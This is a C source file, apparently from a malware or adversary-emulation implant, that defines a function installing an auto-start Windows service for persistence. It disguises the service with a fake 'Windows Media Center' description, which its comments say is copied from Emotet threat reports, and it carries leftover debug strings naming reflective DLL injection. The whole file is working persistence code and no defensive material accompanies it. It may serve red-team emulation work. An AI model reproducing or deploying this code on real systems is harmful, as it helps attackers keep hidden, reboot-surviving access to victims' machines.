#include "Service.h"

/*
 * InstallService:
 *      About:
 *          Creates new service used for persistence
 *      Artifacts:
 *          Writes to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service
 *          after installing service
 *          Creates service with random name that will startup on system reboot
 *      Result:
 *          Returns 0 on success, -1 on error, -2 on insufficient privileges
 */
int InstallService() {
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    SERVICE_DESCRIPTION sd;

    // Open service manager, requires administrator or above privileges
    //MessageBoxA(NULL, "in install service", "Reflective Dll Injection", MB_OK);
    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!schSCManager)
    {
        //if (GetLastError() == ERROR_ACCESS_DENIED)
        //{
        //    //printf("Access was denied!\n");
        //}
        //MessageBoxA(NULL, "Access issue installed!", "Reflective Dll Injection", MB_OK);
        return -2;
    }

    // Verify if service is already installed
    // returns NULL if service does not exist
    if (OpenService(schSCManager, SERVICE_NAME, SERVICE_QUERY_STATUS)) {
        //printf("Already installed, skipping...\n");
        //MessageBoxA(NULL, "already installed!", "Reflective Dll Injection", MB_OK);
        return 0;
    }

    // Create service
    schService = CreateService(schSCManager,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        SERVICE_PATH,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);
    if (!schService)
    {
        if (GetLastError() != ERROR_SERVICE_EXISTS)
        {

            //MessageBoxA(NULL, GetLastError(), "Reflective Dll Injection", MB_OK);
            CloseServiceHandle(schSCManager);
            return -1;
        }
    }

    // Make sure service was created
    schService = OpenService(schSCManager, SERVICE_NAME, GENERIC_ALL);
    if (!schService)
    {
        CloseServiceHandle(schSCManager);
        return -1;
    }

    // Change description of service through optional configuration
    // Description from CTI
    // src: https://unit42.paloaltonetworks.com/attack-chain-overview-emotet-in-december-2020-and-january-2021/
    sd.lpDescription = (LPTSTR)TEXT("Windows Media Center Service for TV and FM broadcast reception");
    if (!ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd))
    {
        //printf("Changing description of service failed.\n");
        return -1;
    }

    CloseServiceHandle(schSCManager);
    CloseServiceHandle(schService);

    return 0;
}